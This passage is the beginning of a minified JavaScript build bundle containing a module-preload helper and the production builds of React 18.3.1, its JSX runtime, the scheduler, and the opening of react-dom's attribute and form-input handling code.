var fb=Object.defineProperty;var kf=t=>{throw TypeError(t)};var mb=(t,e,r)=>e in t?fb(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r;var re=(t,e,r)=>mb(t,typeof e!="symbol"?e+"":e,r),jc=(t,e,r)=>e.has(t)||kf("Cannot "+r);var L=(t,e,r)=>(jc(t,e,"read from private field"),r?r.call(t):e.get(t)),ve=(t,e,r)=>e.has(t)?kf("Cannot add the same private member more than once"):e instanceof WeakSet?e.add(t):e.set(t,r),ce=(t,e,r,n)=>(jc(t,e,"write to private field"),n?n.call(t,r):e.set(t,r),r),rt=(t,e,r)=>(jc(t,e,"access private method"),r);var to=(t,e,r,n)=>({set _(s){ce(t,e,s,r)},get _(){return L(t,e,n)}});function pb(t,e){for(var r=0;r<e.length;r++){const n=e[r];if(typeof n!="string"&&!Array.isArray(n)){for(const s in n)if(s!=="default"&&!(s in t)){const i=Object.getOwnPropertyDescriptor(n,s);i&&Object.defineProperty(t,s,i.get?i:{enumerable:!0,get:()=>n[s]})}}}return Object.freeze(Object.defineProperty(t,Symbol.toStringTag,{value:"Module"}))}(function(){const e=document.createElement("link").relList;if(e&&e.supports&&e.supports("modulepreload"))return;for(const s of document.querySelectorAll('link[rel="modulepreload"]'))n(s);new MutationObserver(s=>{for(const i of s)if(i.type==="childList")for(const o of i.addedNodes)o.tagName==="LINK"&&o.rel==="modulepreload"&&n(o)}).observe(document,{childList:!0,subtree:!0});function r(s){const i={};return s.integrity&&(i.integrity=s.integrity),s.referrerPolicy&&(i.referrerPolicy=s.referrerPolicy),s.crossOrigin==="use-credentials"?i.credentials="include":s.crossOrigin==="anonymous"?i.credentials="omit":i.credentials="same-origin",i}function n(s){if(s.ep)return;s.ep=!0;const i=r(s);fetch(s.href,i)}})();var Kt=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof global<"u"?global:typeof self<"u"?self:{};function ap(t){return t&&t.__esModule&&Object.prototype.hasOwnProperty.call(t,"default")?t.default:t}function gb(t){if(t.__esModule)return t;var e=t.default;if(typeof e=="function"){var r=function n(){return this instanceof n?Reflect.construct(e,arguments,this.constructor):e.apply(this,arguments)};r.prototype=e.prototype}else r={};return Object.defineProperty(r,"__esModule",{value:!0}),Object.keys(t).forEach(function(n){var s=Object.getOwnPropertyDescriptor(t,n);Object.defineProperty(r,n,s.get?s:{enumerable:!0,get:function(){return t[n]}})}),r}var ip={exports:{}},Il={},op={exports:{}},ue={};/**
 * @license React
 * react.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var Hi=Symbol.for("react.element"),xb=Symbol.for("react.portal"),yb=Symbol.for("react.fragment"),vb=Symbol.for("react.strict_mode"),bb=Symbol.for("react.profiler"),wb=Symbol.for("react.provider"),jb=Symbol.for("react.context"),_b=Symbol.for("react.forward_ref"),Nb=Symbol.for("react.suspense"),Sb=Symbol.for("react.memo"),kb=Symbol.for("react.lazy"),Ef=Symbol.iterator;function Eb(t){return t===null||typeof t!="object"?null:(t=Ef&&t[Ef]||t["@@iterator"],typeof t=="function"?t:null)}var lp={isMounted:function(){return!1},enqueueForceUpdate:function(){},enqueueReplaceState:function(){},enqueueSetState:function(){}},cp=Object.assign,dp={};function ka(t,e,r){this.props=t,this.context=e,this.refs=dp,this.updater=r||lp}ka.prototype.isReactComponent={};ka.prototype.setState=function(t,e){if(typeof t!="object"&&typeof t!="function"&&t!=null)throw Error("setState(...): takes an object of state variables to update or a function which returns an object of state variables.");this.updater.enqueueSetState(this,t,e,"setState")};ka.prototype.forceUpdate=function(t){this.updater.enqueueForceUpdate(this,t,"forceUpdate")};function up(){}up.prototype=ka.prototype;function Ku(t,e,r){this.props=t,this.context=e,this.refs=dp,this.updater=r||lp}var qu=Ku.prototype=new up;qu.constructor=Ku;cp(qu,ka.prototype);qu.isPureReactComponent=!0;var Cf=Array.isArray,hp=Object.prototype.hasOwnProperty,Qu={current:null},fp={key:!0,ref:!0,__self:!0,__source:!0};function mp(t,e,r){var n,s={},i=null,o=null;if(e!=null)for(n in e.ref!==void 0&&(o=e.ref),e.key!==void 0&&(i=""+e.key),e)hp.call(e,n)&&!fp.hasOwnProperty(n)&&(s[n]=e[n]);var l=arguments.length-2;if(l===1)s.children=r;else if(1<l){for(var c=Array(l),d=0;d<l;d++)c[d]=arguments[d+2];s.children=c}if(t&&t.defaultProps)for(n in l=t.defaultProps,l)s[n]===void 0&&(s[n]=l[n]);return{$$typeof:Hi,type:t,key:i,ref:o,props:s,_owner:Qu.current}}function Cb(t,e){return{$$typeof:Hi,type:t.type,key:e,ref:t.ref,props:t.props,_owner:t._owner}}function Yu(t){return typeof t=="object"&&t!==null&&t.$$typeof===Hi}function Tb(t){var e={"=":"=0",":":"=2"};return"$"+t.replace(/[=:]/g,function(r){return e[r]})}var Tf=/\/+/g;function _c(t,e){return typeof t=="object"&&t!==null&&t.key!=null?Tb(""+t.key):e.toString(36)}function To(t,e,r,n,s){var i=typeof t;(i==="undefined"||i==="boolean")&&(t=null);var o=!1;if(t===null)o=!0;else switch(i){case"string":case"number":o=!0;break;case"object":switch(t.$$typeof){case Hi:case xb:o=!0}}if(o)return o=t,s=s(o),t=n===""?"."+_c(o,0):n,Cf(s)?(r="",t!=null&&(r=t.replace(Tf,"$&/")+"/"),To(s,e,r,"",function(d){return d})):s!=null&&(Yu(s)&&(s=Cb(s,r+(!s.key||o&&o.key===s.key?"":(""+s.key).replace(Tf,"$&/")+"/")+t)),e.push(s)),1;if(o=0,n=n===""?".":n+":",Cf(t))for(var l=0;l<t.length;l++){i=t[l];var c=n+_c(i,l);o+=To(i,e,r,c,s)}else if(c=Eb(t),typeof c=="function")for(t=c.call(t),l=0;!(i=t.next()).done;)i=i.value,c=n+_c(i,l++),o+=To(i,e,r,c,s);else if(i==="object")throw e=String(t),Error("Objects are not valid as a React child (found: "+(e==="[object Object]"?"object with keys {"+Object.keys(t).join(", ")+"}":e)+"). If you meant to render a collection of children, use an array instead.");return o}function ro(t,e,r){if(t==null)return t;var n=[],s=0;return To(t,n,"","",function(i){return e.call(r,i,s++)}),n}function Pb(t){if(t._status===-1){var e=t._result;e=e(),e.then(function(r){(t._status===0||t._status===-1)&&(t._status=1,t._result=r)},function(r){(t._status===0||t._status===-1)&&(t._status=2,t._result=r)}),t._status===-1&&(t._status=0,t._result=e)}if(t._status===1)return t._result.default;throw t._result}var pt={current:null},Po={transition:null},Ab={ReactCurrentDispatcher:pt,ReactCurrentBatchConfig:Po,ReactCurrentOwner:Qu};function pp(){throw Error("act(...) is not supported in production builds of React.")}ue.Children={map:ro,forEach:function(t,e,r){ro(t,function(){e.apply(this,arguments)},r)},count:function(t){var e=0;return ro(t,function(){e++}),e},toArray:function(t){return ro(t,function(e){return e})||[]},only:function(t){if(!Yu(t))throw Error("React.Children.only expected to receive a single React element child.");return t}};ue.Component=ka;ue.Fragment=yb;ue.Profiler=bb;ue.PureComponent=Ku;ue.StrictMode=vb;ue.Suspense=Nb;ue.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=Ab;ue.act=pp;ue.cloneElement=function(t,e,r){if(t==null)throw Error("React.cloneElement(...): The argument must be a React element, but you passed "+t+".");var n=cp({},t.props),s=t.key,i=t.ref,o=t._owner;if(e!=null){if(e.ref!==void 0&&(i=e.ref,o=Qu.current),e.key!==void 0&&(s=""+e.key),t.type&&t.type.defaultProps)var l=t.type.defaultProps;for(c in e)hp.call(e,c)&&!fp.hasOwnProperty(c)&&(n[c]=e[c]===void 0&&l!==void 0?l[c]:e[c])}var c=arguments.length-2;if(c===1)n.children=r;else if(1<c){l=Array(c);for(var d=0;d<c;d++)l[d]=arguments[d+2];n.children=l}return{$$typeof:Hi,type:t.type,key:s,ref:i,props:n,_owner:o}};ue.createContext=function(t){return t={$$typeof:jb,_currentValue:t,_currentValue2:t,_threadCount:0,Provider:null,Consumer:null,_defaultValue:null,_globalName:null},t.Provider={$$typeof:wb,_context:t},t.Consumer=t};ue.createElement=mp;ue.createFactory=function(t){var e=mp.bind(null,t);return e.type=t,e};ue.createRef=function(){return{current:null}};ue.forwardRef=function(t){return{$$typeof:_b,render:t}};ue.isValidElement=Yu;ue.lazy=function(t){return{$$typeof:kb,_payload:{_status:-1,_result:t},_init:Pb}};ue.memo=function(t,e){return{$$typeof:Sb,type:t,compare:e===void 0?null:e}};ue.startTransition=function(t){var e=Po.transition;Po.transition={};try{t()}finally{Po.transition=e}};ue.unstable_act=pp;ue.useCallback=function(t,e){return pt.current.useCallback(t,e)};ue.useContext=function(t){return pt.current.useContext(t)};ue.useDebugValue=function(){};ue.useDeferredValue=function(t){return pt.current.useDeferredValue(t)};ue.useEffect=function(t,e){return pt.current.useEffect(t,e)};ue.useId=function(){return pt.current.useId()};ue.useImperativeHandle=function(t,e,r){return pt.current.useImperativeHandle(t,e,r)};ue.useInsertionEffect=function(t,e){return pt.current.useInsertionEffect(t,e)};ue.useLayoutEffect=function(t,e){return pt.current.useLayoutEffect(t,e)};ue.useMemo=function(t,e){return pt.current.useMemo(t,e)};ue.useReducer=function(t,e,r){return pt.current.useReducer(t,e,r)};ue.useRef=function(t){return pt.current.useRef(t)};ue.useState=function(t){return pt.current.useState(t)};ue.useSyncExternalStore=function(t,e,r){return pt.current.useSyncExternalStore(t,e,r)};ue.useTransition=function(){return pt.current.useTransition()};ue.version="18.3.1";op.exports=ue;var p=op.exports;const F=ap(p),gp=pb({__proto__:null,default:F},[p]);/**
 * @license React
 * react-jsx-runtime.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var Rb=p,Ib=Symbol.for("react.element"),Lb=Symbol.for("react.fragment"),Mb=Object.prototype.hasOwnProperty,Ob=Rb.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,$b={key:!0,ref:!0,__self:!0,__source:!0};function xp(t,e,r){var n,s={},i=null,o=null;r!==void 0&&(i=""+r),e.key!==void 0&&(i=""+e.key),e.ref!==void 0&&(o=e.ref);for(n in e)Mb.call(e,n)&&!$b.hasOwnProperty(n)&&(s[n]=e[n]);if(t&&t.defaultProps)for(n in e=t.defaultProps,e)s[n]===void 0&&(s[n]=e[n]);return{$$typeof:Ib,type:t,key:i,ref:o,props:s,_owner:Ob.current}}Il.Fragment=Lb;Il.jsx=xp;Il.jsxs=xp;ip.exports=Il;var a=ip.exports,yp={exports:{}},Mt={},vp={exports:{}},bp={};/**
 * @license React
 * scheduler.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */(function(t){function e(P,z){var Q=P.length;P.push(z);e:for(;0<Q;){var H=Q-1>>>1,te=P[H];if(0<s(te,z))P[H]=z,P[Q]=te,Q=H;else break e}}function r(P){return P.length===0?null:P[0]}function n(P){if(P.length===0)return null;var z=P[0],Q=P.pop();if(Q!==z){P[0]=Q;e:for(var H=0,te=P.length,ie=te>>>1;H<ie;){var _e=2*(H+1)-1,Ye=P[_e],ge=_e+1,Je=P[ge];if(0>s(Ye,Q))ge<te&&0>s(Je,Ye)?(P[H]=Je,P[ge]=Q,H=ge):(P[H]=Ye,P[_e]=Q,H=_e);else if(ge<te&&0>s(Je,Q))P[H]=Je,P[ge]=Q,H=ge;else break e}}return z}function s(P,z){var Q=P.sortIndex-z.sortIndex;return Q!==0?Q:P.id-z.id}if(typeof performance=="object"&&typeof performance.now=="function"){var i=performance;t.unstable_now=function(){return i.now()}}else{var o=Date,l=o.now();t.unstable_now=function(){return o.now()-l}}var c=[],d=[],u=1,h=null,f=3,m=!1,g=!1,v=!1,w=typeof setTimeout=="function"?setTimeout:null,y=typeof clearTimeout=="function"?clearTimeout:null,x=typeof setImmediate<"u"?setImmediate:null;typeof navigator<"u"&&navigator.scheduling!==void 0&&navigator.scheduling.isInputPending!==void 0&&navigator.scheduling.isInputPending.bind(navigator.scheduling);function b(P){for(var z=r(d);z!==null;){if(z.callback===null)n(d);else if(z.startTime<=P)n(d),z.sortIndex=z.expirationTime,e(c,z);else break;z=r(d)}}function j(P){if(v=!1,b(P),!g)if(r(c)!==null)g=!0,K(_);else{var z=r(d);z!==null&&ne(j,z.startTime-P)}}function _(P,z){g=!1,v&&(v=!1,y(k),k=-1),m=!0;var Q=f;try{for(b(z),h=r(c);h!==null&&(!(h.expirationTime>z)||P&&!M());){var H=h.callback;if(typeof H=="function"){h.callback=null,f=h.priorityLevel;var te=H(h.expirationTime<=z);z=t.unstable_now(),typeof te=="function"?h.callback=te:h===r(c)&&n(c),b(z)}else n(c);h=r(c)}if(h!==null)var ie=!0;else{var _e=r(d);_e!==null&&ne(j,_e.startTime-z),ie=!1}return ie}finally{h=null,f=Q,m=!1}}var N=!1,S=null,k=-1,C=5,T=-1;function M(){return!(t.unstable_now()-T<C)}function A(){if(S!==null){var P=t.unstable_now();T=P;var z=!0;try{z=S(!0,P)}finally{z?R():(N=!1,S=null)}}else N=!1}var R;if(typeof x=="function")R=function(){x(A)};else if(typeof MessageChannel<"u"){var I=new MessageChannel,J=I.port2;I.port1.onmessage=A,R=function(){J.postMessage(null)}}else R=function(){w(A,0)};function K(P){S=P,N||(N=!0,R())}function ne(P,z){k=w(function(){P(t.unstable_now())},z)}t.unstable_IdlePriority=5,t.unstable_ImmediatePriority=1,t.unstable_LowPriority=4,t.unstable_NormalPriority=3,t.unstable_Profiling=null,t.unstable_UserBlockingPriority=2,t.unstable_cancelCallback=function(P){P.callback=null},t.unstable_continueExecution=function(){g||m||(g=!0,K(_))},t.unstable_forceFrameRate=function(P){0>P||125<P?console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported"):C=0<P?Math.floor(1e3/P):5},t.unstable_getCurrentPriorityLevel=function(){return f},t.unstable_getFirstCallbackNode=function(){return r(c)},t.unstable_next=function(P){switch(f){case 1:case 2:case 3:var z=3;break;default:z=f}var Q=f;f=z;try{return P()}finally{f=Q}},t.unstable_pauseExecution=function(){},t.unstable_requestPaint=function(){},t.unstable_runWithPriority=function(P,z){switch(P){case 1:case 2:case 3:case 4:case 5:break;default:P=3}var Q=f;f=P;try{return z()}finally{f=Q}},t.unstable_scheduleCallback=function(P,z,Q){var H=t.unstable_now();switch(typeof Q=="object"&&Q!==null?(Q=Q.delay,Q=typeof Q=="number"&&0<Q?H+Q:H):Q=H,P){case 1:var te=-1;break;case 2:te=250;break;case 5:te=1073741823;break;case 4:te=1e4;break;default:te=5e3}return te=Q+te,P={id:u++,callback:z,priorityLevel:P,startTime:Q,expirationTime:te,sortIndex:-1},Q>H?(P.sortIndex=Q,e(d,P),r(c)===null&&P===r(d)&&(v?(y(k),k=-1):v=!0,ne(j,Q-H))):(P.sortIndex=te,e(c,P),g||m||(g=!0,K(_))),P},t.unstable_shouldYield=M,t.unstable_wrapCallback=function(P){var z=f;return function(){var Q=f;f=z;try{return P.apply(this,arguments)}finally{f=Q}}}})(bp);vp.exports=bp;var Ub=vp.exports;/**
 * @license React
 * react-dom.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var Db=p,Lt=Ub;function D(t){for(var e="https://reactjs.org/docs/error-decoder.html?invariant="+t,r=1;r<arguments.length;r++)e+="&args[]="+encodeURIComponent(arguments[r]);return"Minified React error #"+t+"; visit "+e+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}var wp=new Set,ui={};function bs(t,e){fa(t,e),fa(t+"Capture",e)}function fa(t,e){for(ui[t]=e,t=0;t<e.length;t++)wp.add(e[t])}var Dr=!(typeof window>"u"||typeof window.document>"u"||typeof window.document.createElement>"u"),hd=Object.prototype.hasOwnProperty,zb=/^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/,Pf={},Af={};function Fb(t){return hd.call(Af,t)?!0:hd.call(Pf,t)?!1:zb.test(t)?Af[t]=!0:(Pf[t]=!0,!1)}function Bb(t,e,r,n){if(r!==null&&r.type===0)return!1;switch(typeof e){case"function":case"symbol":return!0;case"boolean":return n?!1:r!==null?!r.acceptsBooleans:(t=t.toLowerCase().slice(0,5),t!=="data-"&&t!=="aria-");default:return!1}}function Vb(t,e,r,n){if(e===null||typeof e>"u"||Bb(t,e,r,n))return!0;if(n)return!1;if(r!==null)switch(r.type){case 3:return!e;case 4:return e===!1;case 5:return isNaN(e);case 6:return isNaN(e)||1>e}return!1}function gt(t,e,r,n,s,i,o){this.acceptsBooleans=e===2||e===3||e===4,this.attributeName=n,this.attributeNamespace=s,this.mustUseProperty=r,this.propertyName=t,this.type=e,this.sanitizeURL=i,this.removeEmptyString=o}var tt={};"children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style".split(" ").forEach(function(t){tt[t]=new gt(t,0,!1,t,null,!1,!1)});[["acceptCharset","accept-charset"],["className","class"],["htmlFor","for"],["httpEquiv","http-equiv"]].forEach(function(t){var e=t[0];tt[e]=new gt(e,1,!1,t[1],null,!1,!1)});["contentEditable","draggable","spellCheck","value"].forEach(function(t){tt[t]=new gt(t,2,!1,t.toLowerCase(),null,!1,!1)});["autoReverse","externalResourcesRequired","focusable","preserveAlpha"].forEach(function(t){tt[t]=new gt(t,2,!1,t,null,!1,!1)});"allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope".split(" ").forEach(function(t){tt[t]=new gt(t,3,!1,t.toLowerCase(),null,!1,!1)});["checked","multiple","muted","selected"].forEach(function(t){tt[t]=new gt(t,3,!0,t,null,!1,!1)});["capture","download"].forEach(function(t){tt[t]=new gt(t,4,!1,t,null,!1,!1)});["cols","rows","size","span"].forEach(function(t){tt[t]=new gt(t,6,!1,t,null,!1,!1)});["rowSpan","start"].forEach(function(t){tt[t]=new gt(t,5,!1,t.toLowerCase(),null,!1,!1)});var Ju=/[\-:]([a-z])/g;function Xu(t){return t[1].toUpperCase()}"accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height".split(" ").forEach(function(t){var e=t.replace(Ju,Xu);tt[e]=new gt(e,1,!1,t,null,!1,!1)});"xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach(function(t){var e=t.replace(Ju,Xu);tt[e]=new gt(e,1,!1,t,"http://www.w3.org/1999/xlink",!1,!1)});["xml:base","xml:lang","xml:space"].forEach(function(t){var e=t.replace(Ju,Xu);tt[e]=new gt(e,1,!1,t,"http://www.w3.org/XML/1998/namespace",!1,!1)});["tabIndex","crossOrigin"].forEach(function(t){tt[t]=new gt(t,1,!1,t.toLowerCase(),null,!1,!1)});tt.xlinkHref=new gt("xlinkHref",1,!1,"xlink:href","http://www.w3.org/1999/xlink",!0,!1);["src","href","action","formAction"].forEach(function(t){tt[t]=new gt(t,1,!1,t.toLowerCase(),null,!0,!0)});function Zu(t,e,r,n){var s=tt.hasOwnProperty(e)?tt[e]:null;(s!==null?s.type!==0:n||!(2<e.length)||e[0]!=="o"&&e[0]!=="O"||e[1]!=="n"&&e[1]!=="N")&&(Vb(e,r,s,n)&&(r=null),n||s===null?Fb(e)&&(r===null?t.removeAttribute(e):t.setAttribute(e,""+r)):s.mustUseProperty?t[s.propertyName]=r===null?s.type===3?!1:"":r:(e=s.attributeName,n=s.attributeNamespace,r===null?t.removeAttribute(e):(s=s.type,r=s===3||s===4&&r===!0?"":""+r,n?t.setAttributeNS(n,e,r):t.setAttribute(e,r))))}var Gr=Db.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED,no=Symbol.for("react.element"),Os=Symbol.for("react.portal"),$s=Symbol.for("react.fragment"),eh=Symbol.for("react.strict_mode"),fd=Symbol.for("react.profiler"),jp=Symbol.for("react.provider"),_p=Symbol.for("react.context"),th=Symbol.for("react.forward_ref"),md=Symbol.for("react.suspense"),pd=Symbol.for("react.suspense_list"),rh=Symbol.for("react.memo"),Zr=Symbol.for("react.lazy"),Np=Symbol.for("react.offscreen"),Rf=Symbol.iterator;function Oa(t){return t===null||typeof t!="object"?null:(t=Rf&&t[Rf]||t["@@iterator"],typeof t=="function"?t:null)}var Oe=Object.assign,Nc;function qa(t){if(Nc===void 0)try{throw Error()}catch(r){var e=r.stack.trim().match(/\n( *(at )?)/);Nc=e&&e[1]||""}return`
`+Nc+t}var Sc=!1;function kc(t,e){if(!t||Sc)return"";Sc=!0;var r=Error.prepareStackTrace;Error.prepareStackTrace=void 0;try{if(e)if(e=function(){throw Error()},Object.defineProperty(e.prototype,"props",{set:function(){throw Error()}}),typeof Reflect=="object"&&Reflect.construct){try{Reflect.construct(e,[])}catch(d){var n=d}Reflect.construct(t,[],e)}else{try{e.call()}catch(d){n=d}t.call(e.prototype)}else{try{throw Error()}catch(d){n=d}t()}}catch(d){if(d&&n&&typeof d.stack=="string"){for(var s=d.stack.split(`
`),i=n.stack.split(`
`),o=s.length-1,l=i.length-1;1<=o&&0<=l&&s[o]!==i[l];)l--;for(;1<=o&&0<=l;o--,l--)if(s[o]!==i[l]){if(o!==1||l!==1)do if(o--,l--,0>l||s[o]!==i[l]){var c=`
`+s[o].replace(" at new "," at ");return t.displayName&&c.includes("<anonymous>")&&(c=c.replace("<anonymous>",t.displayName)),c}while(1<=o&&0<=l);break}}}finally{Sc=!1,Error.prepareStackTrace=r}return(t=t?t.displayName||t.name:"")?qa(t):""}function Hb(t){switch(t.tag){case 5:return qa(t.type);case 16:return qa("Lazy");case 13:return qa("Suspense");case 19:return qa("SuspenseList");case 0:case 2:case 15:return t=kc(t.type,!1),t;case 11:return t=kc(t.type.render,!1),t;case 1:return t=kc(t.type,!0),t;default:return""}}function gd(t){if(t==null)return null;if(typeof t=="function")return t.displayName||t.name||null;if(typeof t=="string")return t;switch(t){case $s:return"Fragment";case Os:return"Portal";case fd:return"Profiler";case eh:return"StrictMode";case md:return"Suspense";case pd:return"SuspenseList"}if(typeof t=="object")switch(t.$$typeof){case _p:return(t.displayName||"Context")+".Consumer";case jp:return(t._context.displayName||"Context")+".Provider";case th:var e=t.render;return t=t.displayName,t||(t=e.displayName||e.name||"",t=t!==""?"ForwardRef("+t+")":"ForwardRef"),t;case rh:return e=t.displayName||null,e!==null?e:gd(t.type)||"Memo";case Zr:e=t._payload,t=t._init;try{return gd(t(e))}catch{}}return null}function Gb(t){var e=t.type;switch(t.tag){case 24:return"Cache";case 9:return(e.displayName||"Context")+".Consumer";case 10:return(e._context.displayName||"Context")+".Provider";case 18:return"DehydratedFragment";case 11:return t=e.render,t=t.displayName||t.name||"",e.displayName||(t!==""?"ForwardRef("+t+")":"ForwardRef");case 7:return"Fragment";case 5:return e;case 4:return"Portal";case 3:return"Root";case 6:return"Text";case 16:return gd(e);case 8:return e===eh?"StrictMode":"Mode";case 22:return"Offscreen";case 12:return"Profiler";case 21:return"Scope";case 13:return"Suspense";case 19:return"SuspenseList";case 25:return"TracingMarker";case 1:case 0:case 17:case 2:case 14:case 15:if(typeof e=="function")return e.displayName||e.name||null;if(typeof e=="string")return e}return null}function wn(t){switch(typeof t){case"boolean":case"number":case"string":case"undefined":return t;case"object":return t;default:return""}}function Sp(t){var e=t.type;return(t=t.nodeName)&&t.toLowerCase()==="input"&&(e==="checkbox"||e==="radio")}function Wb(t){var e=Sp(t)?"checked":"value",r=Object.getOwnPropertyDescriptor(t.constructor.prototype,e),n=""+t[e];if(!t.hasOwnProperty(e)&&typeof r<"u"&&typeof r.get=="function"&&typeof r.set=="function"){var s=r.get,i=r.set;return Object.defineProperty(t,e,{configurable:!0,get:function(){return s.call(this)},set:function(o){n=""+o,i.call(this,o)}}),Object.defineProperty(t,e,{enumerable:r.enumerable}),{getValue:function(){return n},setValue:function(o){n=""+o},stopTracking:function(){t._valueTracker=null,delete t[e]}}}}function so(t){t._valueTracker||(t._valueTracker=Wb(t))}function kp(t){if(!t)return!1;var e=t._valueTracker;if(!e)return!0;var r=e.getValue(),n="";return t&&(n=Sp(t)?t.checked?"true":"false":t.value),t=n,t!==r?(e.setValue(t),!0):!1}function Ko(t){if(t=t||(typeof document<"u"?document:void 0),typeof t>"u")return null;try{return t.activeElement||t.body}catch{return t.body}}function xd(t,e){var r=e.checked;return Oe({},e,{defaultChecked:void 0,defaultValue:void 0,value:void 0,checked:r??t._wrapperState.initialChecked})}function If(t,e){var r=e.defaultValue==null?"":e.defaultValue,n=e.checked!=null?e.checked:e.defaultChecked;r=wn(e.value!=null?e.value:r),t._wrapperState={initialChecked:n,initialValue:r,controlled:e.type==="checkbox"||e.type==="radio"?e.checked!=null:e.value!=null}}function Ep(t,e){e=e.checked,e!=null&&Zu(t,"checked",e,!1)}function yd(t,e){Ep(t,e);var r=wn(e.value),n=e.type;if(r!=null)n==="number"?(r===0&&t.value===""||t.value!=r)&&(t.value=""+r):t.value!==""+r&&(t.value=""+r);else if(n==="submit"||n==="reset"){t.removeAttribute("value");return}e.hasOwnProperty("value")?vd(t,e.type,r):e.hasOwnProperty("defaultValue")&&vd(t,e.type,wn(e.defaultValue)),e.checked==null&&e.defaultChecked!=null&&(t.defaultChecked=!!e.defaultChecked)}function Lf(t,e,r){if(e.hasOwnProperty("value")||e.hasOwnProperty("defaultValue")){var n=e.type;if(!(n!=="submit"&&n!=="reset"||e.value!==void 0&&e.value!==null))return;e=""+t._wrapperState.initialValue,r||e===t.value||(t.value=e),t.defaultValue=e}r=t.name,r!==""&&(t.name=""),t.defaultChecked=!!t._wrapperState.initialChecked,r!==""&&(t.name=r)}function vd(t,e,r){(e!=="number"||Ko(t.ownerDocument)!==t)&&(r==null?t.defaultValue=""+t._wrapperState.initialValue:t.defaultValue!==""+r&&(t.defaultValue=""+r))}var Qa=Array.isArray;function Qs(t,e,r,n){if(t=t.options,e){e={};for(var s=0;s<r.length;s++)e["$"+r[s]]=!0;for(r=0;r<t.length;r++)s=e.hasOwnProperty("$"+t[r].value),t[r].selected!==s&&(t[r].selected=s),s&&n&&(t[r].defaultSelected=!0)}else{for(r=""+wn(r),e=null,s=0;s<t.length;s++){if(t[s].value===r){t[s].selected=!0,n&&(t[s].defaultSelected=!0);return}e!==null||t[s].disabled||(e=t[s])}e!==null&&(e.selected=!0)}}function bd(t,e){if(e.dangerouslySetInnerHTML!=null)throw Error(D(91));return Oe({},e,{value:void 0,defaultValue:void 0,children:""+t._wrapperState.initialValue})}function Mf(t,e){var r=e.value;if(r==null){if(r=e.children,e=e.defaultValue,r!=null){if(e!=null)throw Error(D(92));if(Qa(r)){if(1<r.length)throw Error(D(93));r=r[0]}e=r}e==null&&(e=""),r=e}t._wrapperState={initialValue:wn(r)}}function Cp(t,e){var r=wn(e.value),n=wn(e.defaultValue);r!=null&&(r=""+r,r!==t.value&&(t.value=r),e.defaultValue==null&&t.defaultValue!==r&&(t.defaultValue=r)),n!=null&&(t.defaultValue=""+n)}function Of(t){var e=t.textContent;e===t._wrapperState.initialValue&&e!==""&&e!==null&&(t.value=e)}function Tp(t){switch(t){case"svg":return"http://www.w3.org/2000/svg";case"math":return"http://www.w3.org/1998/Math/MathML";default:return"http://www.w3.org/1999/xhtml"}}function wd(t,e){return t==null||t==="http://www.w3.org/1999/xhtml"?Tp(e):t==="http://www.w3.org/2000/svg"&&e==="foreignObject"?"http://www.w3.org/1999/xhtml":t}var ao,Pp=function(t){return typeof MSApp<"u"&&MSApp.execUnsafeLocalFunction?function(e,r,n,s){MSApp.execUnsafeLocalFunction(function(){return t(e,r,n,s)})}:t}(function(t,e){if(t.namespaceURI!=="http://www.w3.org/2000/svg"||"innerHTML"in t)t.innerHTML=e;else{for(ao=ao||document.createElement("div"),ao.innerHTML="<svg>"+e.valueOf().toString()+"</svg>",e=ao.firstChild;t.firstChild;)t.removeChild(t.firstChild);for(;e.firstChild;)t.appendChild(e.firstChild)}});function hi(t,e){if(e){var r=t.firstChild;if(r&&r===t.lastChild&&r.nodeType===3){r.nodeValue=e;return}}t.textContent=e}var 